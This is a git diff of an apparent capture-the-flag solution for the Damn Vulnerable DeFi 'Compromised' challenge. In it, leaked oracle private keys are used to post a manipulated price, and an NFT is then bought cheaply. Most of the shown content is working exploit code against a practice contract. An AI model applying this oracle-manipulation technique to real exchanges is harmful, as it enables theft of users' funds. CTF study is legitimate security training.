@@ -62,7 +62,7 @@ describe('Compromised challenge', function () {
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
         // better blender the ice up
-        const tokenId = "1";
+        const tokenSymbol = "DVNFT";
 		const passwords = [
             "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
             "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48"
@@ -75,15 +75,15 @@ describe('Compromised challenge', function () {
             wallets.push(wallet);
         }
 
-        const startPrice = await this.oracle.getMedianPrice("DVNFT")
+        const startPrice = await this.oracle.getMedianPrice(tokenSymbol)
         console.log(startPrice.toString())
 
         for (let i = 0; i < wallets.length; i++) {
-			await this.oracle.connect(wallets[i]).postPrice(tokenId, 1);
+			await this.oracle.connect(wallets[i]).postPrice(tokenSymbol, 1);
         }
     
         console.log("price manipulated")
-        const afterPrice = await this.oracle.getMedianPrice("DVNFT")
+        const afterPrice = await this.oracle.getMedianPrice(tokenSymbol)
         console.log(afterPrice.toString())
 		await this.exchange.connect(attacker).buyOne();
         console.log("Bought one")
